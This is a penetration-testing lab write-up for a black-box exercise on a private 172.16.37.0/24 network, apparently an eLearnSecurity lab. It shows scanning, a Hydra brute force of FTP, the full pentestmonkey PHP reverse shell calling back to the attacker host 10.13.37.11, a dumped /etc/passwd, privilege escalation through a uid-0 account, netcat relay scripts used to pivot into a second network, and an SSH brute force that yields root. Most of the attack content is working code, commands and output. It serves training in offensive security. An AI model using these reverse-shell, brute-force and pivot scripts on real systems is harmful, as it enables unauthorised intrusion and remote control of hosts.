---
description: >-
  You have been engaged in a Black-box Penetration Test (172.16.37.0/24 range).
  Your goal is to read the flag file on each machine.
---

# Black Box Test #3

## Prework

### Connect to VPN

```bash
sudo openvpn black-box-penetration-test-3.ovpn
```

### Scan network

```bash
sudo nmap -sn 172.16.37.0/24 -oN hostAlive.nmap &&
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt &&
sudo nmap   -iL ips.txt -A --open -oX portScan.xml &&
nmap2md.sh portScan.xml | xclip
```

## Scanner

> Generated on **Sun Jul 18 11:53:14 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
```

## Hosts Alive (2)

| Host          | OS               | Accuracy |
| ------------- | ---------------- | -------- |
| 172.16.37.220 | Linux 3.11 - 4.1 | 95%      |
| 172.16.37.234 | Linux 3.11 - 4.1 | 95%      |

## Open Ports and Running Services

### ✔️172.16.37.220 (Linux 3.11 - 4.1 - 95%)

| Port     | State | Service    | Version             |
| -------- | ----- | ---------- | ------------------- |
| 80/tcp   | open  | http       | Apache httpd 2.4.18 |
| 3307/tcp | open  | tcpwrapped |                     |

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://](http://172.16.64.81)172.16.37.220
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jul 18 12:20:43 EDT 2021
--------------------------------

http://172.16.37.220:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/

Dirs found with a 403 response:

/icons/
/javascript/
/icons/small/


--------------------------------
--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Found relevant information at view-source:**[**http://172.16.37.220/**](http://172.16.37.220)****

This discovers a new IP in a new network: **172.16.50.222**

```
<!--ens192    Link encap:Ethernet  HWaddr 00:50:56:a0:9c:e3  
          inet addr:172.16.37.220  Bcast:172.16.37.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fea0:9ce3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:720452 errors:0 dropped:32 overruns:0 frame:0
          TX packets:590197 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:108309918 (108.3 MB)  TX bytes:93850516 (93.8 MB)

ens224    Link encap:Ethernet  HWaddr 00:50:56:a0:90:a2  
          inet addr:172.16.50.222  Bcast:172.16.50.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fea0:90a2/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:36 errors:0 dropped:20 overruns:0 frame:0
          TX packets:48 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3922 (3.9 KB)  TX bytes:5611 (5.6 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:18699 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18699 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:1417948 (1.4 MB)  TX bytes:1417948 (1.4 MB)

-->
```
{% endhint %}

### ✔️172.16.37.234 (Linux 3.11 - 4.1 - 95%)

| Port      | State | Service | Version             |
| --------- | ----- | ------- | ------------------- |
| 40121/tcp | open  | ftp     | ProFTPD 1.3.0a      |
| 40180/tcp | open  | http    | Apache httpd 2.4.18 |

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://](http://172.16.64.81)172.16.37.234:40180
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jul 18 15:18:12 EDT 2021
--------------------------------

http://172.16.37.234:40180
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/xyz/

Dirs found with a 403 response:

/icons/
/icons/small/


--------------------------------
--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Dirbuster found the following url:** [**http://172.16.37.234:40180/xyz/**](http://172.16.37.234:40180/xyz/)

This is the content, which discovers a new IP in a new network: **172.16.50.224**

```
<!-- cmd: --><hr />ens192    Link encap:Ethernet  HWaddr 00:50:56:a0:88:b6  
          inet addr:172.16.37.234  Bcast:172.16.37.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fea0:88b6/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2038265 errors:0 dropped:23 overruns:0 frame:0
          TX packets:1588929 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:284381733 (284.3 MB)  TX bytes:245921592 (245.9 MB)

ens224    Link encap:Ethernet  HWaddr 00:50:56:a0:09:4d  
          inet addr:172.16.50.224  Bcast:172.16.50.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fea0:94d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:52 errors:0 dropped:13 overruns:0 frame:0
          TX packets:30 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:5703 (5.7 KB)  TX bytes:4104 (4.1 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:194609 errors:0 dropped:0 overruns:0 frame:0
          TX packets:194609 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:16100124 (16.1 MB)  TX bytes:16100124 (16.1 MB)

```
{% endhint %}

{% hint style="info" %}
**ftp splash screen suggests to login with 'ftpuser' while trying to connect.**

```
ftp 172.16.37.234 40121 
Connected to 172.16.37.234.
220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
Name (172.16.37.234:kali): ftpuser
```
{% endhint %}

{% tabs %}
{% tab title="Hydra" %}
```bash
hydra -t 30 -l ftpuser -P /usr/share/amass/wordlists/all.txt ftp://172.16.37.234:40121
```
{% endtab %}

{% tab title="Ouput" %}
```bash
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 14:34:05
[DATA] max 30 tasks per 1 server, overall 30 tasks, 420112 login tries (l:1/p:420112), ~14004 tries per task
[DATA] attacking ftp://172.16.37.234:40121/
[STATUS] 1439.00 tries/min, 1439 tries in 00:01h, 418679 to do in 04:51h, 30 active
[STATUS] 1712.67 tries/min, 5138 tries in 00:03h, 414980 to do in 04:03h, 30 active
[STATUS] 1845.57 tries/min, 12919 tries in 00:07h, 407199 to do in 03:41h, 30 active
[STATUS] 1657.07 tries/min, 24856 tries in 00:15h, 395262 to do in 03:59h, 30 active
[STATUS] 1628.10 tries/min, 50471 tries in 00:31h, 369648 to do in 03:48h, 30 active
[STATUS] 1722.51 tries/min, 80958 tries in 00:47h, 339161 to do in 03:17h, 30 active
[STATUS] 1799.33 tries/min, 113358 tries in 01:03h, 306769 to do in 02:51h, 30 active
[STATUS] 1870.38 tries/min, 147760 tries in 01:19h, 272367 to do in 02:26h, 30 active
[STATUS] 1921.68 tries/min, 182560 tries in 01:35h, 237567 to do in 02:04h, 30 active
[40121][ftp] host: 172.16.37.234   login: ftpuser   password: ftpuser

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Found credentials for ftp server through hydra: ftpuser/ftpuser**

Now that we have access to the ftp, **we can upload a PHP reverse shell**, and invoke it by opening this URL in your browser: [**http://172.16.37.234:40180/xyz/rev-shell.php**](http://172.16.37.234:40180/xyz/rev-shell.php)****
{% endhint %}

{% tabs %}
{% tab title="Netcat Listener (local machine)" %}
```
nc -l 1234
```
{% endtab %}

{% tab title="PHP Reverse Shell" %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.37.11';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```
{% endtab %}

{% tab title="/etc/passwd" %}
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:116::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:112:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/bin/false
hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:115:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:117:126:RealtimeKit,,,:/proc:/bin/false
saned:x:118:127::/var/lib/saned:/bin/false
usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
speech-dispatcher:x:120:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
elsuser:x:1000:1000:elsuser,,,:/home/elsuser:/bin/bash
ftpuser:x:0:0::/home/ftpuser:/bin/bash
test:x:1001:1002::/home/test:

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**ftpuser has root rights (just use the same password)**:

```
ftpuser:x:0:0::/home/ftpuser:/bin/bash
```

```bash
www-data@xubuntu:/home/ftpuser$ su ftpuser
Password: 
root@xubuntu:~# root@xubuntu:/# find . | grep .flag.txt
find: ‘./run/user/108/gvfs’: Permission denied
./var/www/.flag.txt
./home/ftpuser/.flag.txt
```
{% endhint %}

{% hint style="success" %}
**Flag encountered!**

```
root@xubuntu:/# cat /var/www/.flag.txt
You got the first machine!
```
{% endhint %}

We run `nmap` from this new machine to discover opened ports on 172.16.50.224

{% tabs %}
{% tab title="nmap (on 172.16.50.224) " %}
```bash
nmap 172.16.50.222 -sV -n -v -Pn -p- -T4 -oX portScan.xml
```
{% endtab %}

{% tab title="Output" %}
## Scanner

> Generated on **Sun Jul 18 21:04:56 2021** with `nmap 7.01`.

```bash
nmap -sV -n -v -Pn -p- -T4 -oX portScan.xml --min-rate=5000 172.16.50.222
```

## Hosts Alive (1)

| Host          | OS | Accuracy |
| ------------- | -- | -------- |
| 172.16.50.222 |    | %        |

## Open Ports and Running Services

### 172.16.50.222 ( - %)

| Port     | State | Service    | Version                         |
| -------- | ----- | ---------- | ------------------------------- |
| 22/tcp   | open  | ssh        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp   | open  | http       | Apache httpd 2.4.18             |
| 3307/tcp | open  | tcpwrapped |                                 |
{% endtab %}
{% endtabs %}

Use `netcat` to pivot an `hydra` attack for the `ssh` service on `172.16.50.222` :

{% tabs %}
{% tab title=" Attacker Machine (listener.sh)" %}
```bash
#!/bin/bash
# Listener Relay

cd /tmp; mknod backpipex p
while true; do
    nc -lvp 111 0<backpipex | nc -lvp 222 | tee backpipex
done;

```
{% endtab %}

{% tab title="Pivot Machine (c2c-relay.sh)" %}
```bash
#!/bin/bash
# Client to Client Relay on

cd /tmp; mknod backpipex p 
while true; do
    nc 172.16.50.222 22 0<backpipex | nc 10.13.37.11 111 | tee backpipex   
done;
```
{% endtab %}

{% tab title="Attacker Machine (Attack)" %}
```
hydra -s 222 -V -l root -P /usr/share/wordlists/dirb/small.txt 127.0.0.1 ssh
```
{% endtab %}

{% tab title="Output" %}
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-18 18:24:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
[DATA] attacking ssh://127.0.0.1:222/
[222][ssh] host: 127.0.0.1   login: root   password: root
1 of 1 target successfully completed, 1 valid password found

```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Flag encountered for** `172.16.50.222!`

`root/root`, just login from your attacker machine:

```
> ssh root@127.0.0.1 -p 222
root@127.0.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

199 packages can be updated.
11 updates are security updates.

Last login: Sun Jul 18 22:14:47 2021 from 172.16.50.224

root@xubuntu:~# find / | grep flag.txt
find: ‘/run/user/108/gvfs’: Permission denied
/root/.flag.txt

root@xubuntu:~# cat /root/.flag.txt
Congratz! You got it.
```
{% endhint %}

## References

{% embed url="https://security.stackexchange.com/questions/188921/use-netcat-to-pivot" %}

